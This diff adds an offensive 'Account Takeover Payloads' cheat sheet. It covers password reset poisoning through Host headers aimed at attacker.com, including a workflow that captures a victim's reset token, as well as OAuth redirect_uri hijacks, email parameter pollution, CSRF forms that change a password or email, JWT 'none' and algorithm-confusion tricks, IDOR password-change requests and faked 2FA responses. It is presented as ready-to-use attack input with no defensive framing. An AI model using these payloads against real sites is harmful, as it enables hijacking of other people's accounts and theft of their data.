@@ -1,0 +1,244 @@
+# Account Takeover Payloads
+
+## ========================================
+## PASSWORD RESET EXPLOITATION
+## ========================================
+
+# Token manipulation
+?token=abc123
+?token=abc124
+?reset_token=predictable_token
+
+# Email parameter pollution
+email=victim@example.com&email=attacker@evil.com
+
+# Host header injection
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+
+# Token reuse
+Use expired/old reset tokens
+
+# Token prediction
+Sequential tokens: token1, token2, token3
+Timestamp-based tokens
+
+## ========================================
+## OAUTH/SSO VULNERABILITIES
+## ========================================
+
+# Redirect URI manipulation
+?redirect_uri=http://attacker.com
+?redirect_uri=http://target.com@attacker.com
+?redirect_uri=http://target.com.attacker.com
+
+# State parameter
+Missing state parameter
+Predictable state values
+
+# Authorization code theft
+Intercept OAuth callback
+
+## ========================================
+## SESSION FIXATION
+## ========================================
+
+# Set victim's session
+Set-Cookie: sessionid=attacker_controlled
+
+# Pre-authentication session
+1. Get session ID before login
+2. Make victim login with that session
+3. Attacker gains access
+
+## ========================================
+## CSRF ON CRITICAL FUNCTIONS
+## ========================================
+
+# Password change CSRF
+<form action="http://target.com/change-password" method="POST">
+  <input name="new_password" value="attacker123">
+  <input type="submit">
+</form>
+
+# Email change CSRF
+<form action="http://target.com/change-email" method="POST">
+  <input name="email" value="attacker@evil.com">
+</form>
+
+## ========================================
+## EMAIL VERIFICATION BYPASS
+## ========================================
+
+# Race condition
+Register and trigger action before email verified
+
+# Token manipulation
+Reuse tokens from other accounts
+
+# Parameter pollution
+email=victim@example.com&verified=true
+
+## ========================================
+## 2FA/MFA BYPASS
+## ========================================
+
+# Missing 2FA on critical functions
+/change-password (no 2FA)
+/change-email (no 2FA)
+
+# Response manipulation
+{"2fa_required": false}
+{"2fa_valid": true}
+
+# Rate limiting bypass
+Unlimited 2FA attempts
+
+# Backup codes
+Predictable backup codes
+Reusable backup codes
+
+## ========================================
+## ACCOUNT ENUMERATION
+## ========================================
+
+# Username enumeration
+Different responses for valid/invalid users
+Timing attacks
+
+# Email enumeration
+Password reset for valid emails only
+Registration error messages
+
+## ========================================
+## INSECURE PASSWORD RECOVERY
+## ========================================
+
+# Security questions
+Predictable answers
+Publicly available information
+
+# Recovery via email
+Email parameter manipulation
+Host header poisoning
+
+# Recovery via SMS
+SIM swapping
+SS7 attacks
+
+## ========================================
+## JWT VULNERABILITIES
+## ========================================
+
+# Algorithm confusion
+Change "alg": "RS256" to "alg": "HS256"
+
+# None algorithm
+Change "alg": "RS256" to "alg": "none"
+
+# Weak secrets
+Brute force JWT secret
+
+## ========================================
+## API KEY EXPLOITATION
+## ========================================
+
+# Leaked API keys
+GitHub, public repositories
+Client-side code
+
+# Predictable API keys
+Sequential keys
+Timestamp-based keys
+
+## ========================================
+## SUBDOMAIN TAKEOVER
+## ========================================
+
+# Unclaimed subdomains
+auth.target.com (pointing to unclaimed service)
+sso.target.com (dangling DNS)
+
+## ========================================
+## REMEMBER ME FUNCTIONALITY
+## ========================================
+
+# Weak token generation
+Predictable remember-me tokens
+MD5(username)
+
+# Token theft
+Steal remember-me cookie
+No expiration on tokens
+
+## ========================================
+## IDOR IN ACCOUNT FUNCTIONS
+## ========================================
+
+# Change other user's password
+POST /api/user/456/password
+{"password": "newpass123"}
+
+# Access other user's data
+GET /api/user/456/details
+
+## ========================================
+## RACE CONDITIONS
+## ========================================
+
+# Parallel password reset requests
+Send multiple reset requests simultaneously
+
+# Parallel registration
+Register same email multiple times
+
+## ========================================
+## RESPONSE MANIPULATION
+## ========================================
+
+# Client-side validation bypass
+{"user_exists": false} → {"user_exists": true}
+{"password_valid": false} → {"password_valid": true}
+
+## ========================================
+## COMMON ENDPOINTS
+## ========================================
+
+/forgot-password
+/reset-password
+/change-password
+/change-email
+/account/settings
+/api/user/update
+/oauth/authorize
+/saml/login
+
+## ========================================
+## EXPLOITATION WORKFLOW
+## ========================================
+
+# 1. Password Reset Poisoning
+POST /forgot-password
+Host: attacker.com
+email=victim@example.com
+
+# 2. Victim receives link
+http://attacker.com/reset?token=abc123
+
+# 3. Attacker captures token
+# 4. Attacker resets password
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite Collaborator
+Test host header injection
+
+# Token analysis
+jwt.io
+JWT cracking tools
+
+# Automation
+Python requests library
+Selenium for testing flows
